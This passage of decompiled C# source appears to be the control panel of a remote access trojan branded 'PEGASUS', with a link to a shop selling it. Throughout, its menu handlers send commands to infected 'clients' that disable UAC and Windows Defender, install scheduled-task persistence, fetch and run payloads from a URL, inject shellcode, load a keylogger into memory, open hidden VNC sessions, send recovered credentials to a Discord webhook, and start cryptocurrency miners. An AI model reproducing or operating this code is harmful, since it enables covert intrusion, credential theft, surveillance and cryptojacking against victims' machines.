					Process.Start(reupload("b~~zy0%%|odegied~xef$ieg%|odeg'yel~}kxo'|cnoey%"));
				}).Start();
			}
			else if (text.Contains("YASDO^"))
			{
				new Thread((ThreadStart)delegate
				{
					Process.Start(reupload("b~~zy0%%yasdo~'iexzexk~ced$ieg%ik~omexs%|cnoe'~\u007f~exckfy%"));
				}).Start();
			}
		}

		private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using FormSetting formSetting = new FormSetting();
			formSetting.ShowDialog();
		}

		private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Connection.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
					{
						FormNetstat formNetstat = new FormNetstat();
						formNetstat.Name = "Netstat:" + clients.ID;
						formNetstat.Text = "Netstat:" + clients.ID;
						formNetstat.F = this;
						formNetstat.ParentClient = clients;
						formNetstat.Show();
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = InputDialog.Show("\nPayload link.\n");
			if (string.IsNullOrEmpty(text) || listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
				msgPack.ForcePathObject("url").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = InputDialog.Show("\nPayload link.\n");
				if (string.IsNullOrEmpty(text))
				{
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
				msgPack.ForcePathObject("url").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "InstallSchtask:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableUAC:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableDefedner:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void ConnectTimeout_Tick(object sender, EventArgs e)
		{
			Clients[] allClients = GetAllClients();
			if (allClients.Length == 0)
			{
				return;
			}
			Clients[] array = allClients;
			foreach (Clients clients in array)
			{
				if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
				{
					clients.Disconnected();
				}
			}
		}

		private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\REG.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
					{
						FormRegistryEditor formRegistryEditor = new FormRegistryEditor();
						formRegistryEditor.Name = "remoteRegedit:" + clients.ID;
						formRegistryEditor.Text = "remoteRegedit:" + clients.ID;
						formRegistryEditor.ParentClient = clients;
						formRegistryEditor.F = this;
						formRegistryEditor.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FC.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
					{
						FormFun formFun = new FormFun();
						formFun.Name = "fun:" + clients.ID;
						formFun.Text = "fun:" + clients.ID;
						formFun.F = this;
						formFun.ParentClient = clients;
						formFun.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Multiselect = false;
				openFileDialog.Filter = "(*.bin)|*.bin";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
					msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ML.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void uploadsPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "hVNCStart";
				msgPack.ForcePathObject("port").AsString = "4448";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ZEUS.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private async Task uploadPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					_ = selectedClients[i];
					new Thread((ThreadStart)delegate
					{
						try
						{
							Task task = Task.Factory.StartNew(delegate
							{
								fun1();
							});
							Task.WaitAll(task);
						}
						catch
						{
						}
					}).Start();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private async void startToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					_ = selectedClients[i];
					await uploadPluginToolStripMenuItem_Click(sender, e);
					new VNCForm().ShowDialog();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void stopToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				_ = selectedClients[i];
				try
				{
					new Thread((ThreadStart)delegate
					{
						try
						{
							Task task = Task.Factory.StartNew(delegate
							{
								fun2();
							});
							Task.WaitAll(task);
						}
						catch
						{
						}
					}).Start();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
					break;
				}
			}
		}

		public void fun1()
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "hVNCStart";
				msgPack.ForcePathObject("port").AsString = "4448";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ZEUS.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		public void fun2()
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "hVNCStop";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ZEUS.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
					break;
				}
			}
		}

		private void builderToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			using FormBuilder formBuilder = new FormBuilder();
			formBuilder.ShowDialog();
		}

		private void blockClientsToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void documentationToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void aboutToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			using FormAbout formAbout = new FormAbout();
			formAbout.ShowDialog();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
		}

		private void panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		private void guna2PictureBox1_Click_1(object sender, EventArgs e)
		{
			Close();
		}

		private void tasksControlToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void onToolStripMenuItem_Click(object sender, EventArgs e)
		{
			guna2Transition1.ShowSync(panel2);
			guna2Transition1.ShowSync(panel3);
			guna2Transition1.ShowSync(guna2ShadowPanel1);
		}

		private void offToolStripMenuItem_Click(object sender, EventArgs e)
		{
			guna2Transition2.HideSync(guna2ShadowPanel1);
			guna2Transition1.HideSync(panel3);
			guna2Transition1.HideSync(panel2);
		}

		private void guna2PictureBox2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Normal;
			guna2PictureBox4.Visible = true;
			guna2PictureBox2.Visible = false;
		}

		private void guna2PictureBox3_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void guna2PictureBox4_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Maximized;
			guna2PictureBox4.Visible = false;
			guna2PictureBox2.Visible = true;
		}

		private ushort GetPortSafe()
		{
			if (ushort.TryParse(numPort.Value.ToString(CultureInfo.InvariantCulture), out var result))
			{
				return result;
			}
			return 0;
		}

		private void btnStartL_Click(object sender, EventArgs e)
		{
			ushort portSafe = GetPortSafe();
			PEGASUS.Properties.Settings.Default.Ports = Convert.ToString(portSafe);
			PEGASUS.Properties.Settings.Default.Save();
			if (!File.Exists(Settings.CertificatePath))
			{
				Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
			}
			else
			{
				Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
			}
			new Thread((ThreadStart)delegate
			{
				Connect();
			}).Start();
			Listener.ForeColor = Color.FromArgb(191, 37, 33);
			Listener.Text = "Listening on port:" + portSafe;
			guna2Transition2.HideSync(buttonspanel);
		}

		private void btnStopL_Click(object sender, EventArgs e)
		{
			ushort portSafe = GetPortSafe();
			Listener.ForeColor = Color.Red;
			Listener.Text = "Not Listening ";
			guna2Transition2.HideSync(buttonspanel);
			Listener listener = new Listener();
			try
			{
				listener.Disconnect(portSafe);
			}
			catch
			{
			}
		}

		private void pictureBox1_Click(object sender, EventArgs e)
		{
			if (!buttonspanel.Visible)
			{
				guna2Transition1.ShowSync(buttonspanel);
			}
			else
			{
				guna2Transition2.HideSync(buttonspanel);
			}
		}

		private void guna2Panel3_MouseLeave(object sender, EventArgs e)
		{
			guna2Transition1.HideSync(buttonspanel);
		}

		private bool MouseIsOverControl(Panel buttonspanel)
		{
			return buttonspanel.ClientRectangle.Contains(buttonspanel.PointToClient(Cursor.Position));
		}

		private void guna2Panel3_CursorChanged(object sender, EventArgs e)
		{
			if (!MouseIsOverControl(buttonspanel))
			{
				guna2Transition1.HideSync(buttonspanel);
			}
		}

		private void toolStripMenuItem68_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\KL.exe")));
				msgPack.ForcePathObject("Inject").AsString = "";
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Auto Keylogger:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SM.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void sKYNETToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Promitheas.dll");
					clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
					break;
				}
			}
		}

		private void guna2Shapes4_Click(object sender, EventArgs e)
		{
			if (!buttonspanel.Visible)
			{
				guna2Transition1.ShowSync(buttonspanel);
			}
			else
			{
				guna2Transition2.HideSync(buttonspanel);
			}
		}

		private void sKYNETSHOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("https://skynet-corporation.com/shop/");
		}

		private void toolStripMenuItem59_Click(object sender, EventArgs e)
		{
			Process.Start("https://skynet-corporation.com/video-gallery/");
		}

		private void recoverAllSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = InputDialog.Show("\nYour Discord Webhook.\n");
			if (string.IsNullOrEmpty(text) || listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "StSStart";
				msgPack.ForcePathObject("webhook").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\StS.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void startToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			string text = InputDialog.Show("\nType Pool:Port.\n\n");
			string text2 = InputDialog.Show("\nType Wallet.\n\n");
			string text3 = InputDialog.Show("\nType Password.\n\n");
			string text4 = InputDialog.Show("\nType Algorithm.\n\n");
			string text5 = InputDialog.Show("\nType Threads.\n\n");
			if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text3) || string.IsNullOrEmpty(text5) || string.IsNullOrEmpty(text4) || listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "StartMiner";
				msgPack.ForcePathObject("pool").AsString = text;
				msgPack.ForcePathObject("wallet").AsString = text2;
				msgPack.ForcePathObject("password").AsString = text3;
				msgPack.ForcePathObject("algo").AsString = text4;
				msgPack.ForcePathObject("threads").AsString = text5;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miner.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void startToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "WatchDogStart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\WatchDogs.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void stopToolStripMenuItem2_Click_1(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "WatchDogStop";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\WatchDogs.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void startToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "TaskMgrStart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\WatchDogs.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void stopToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "TaskMgrStop";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\WatchDogs.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
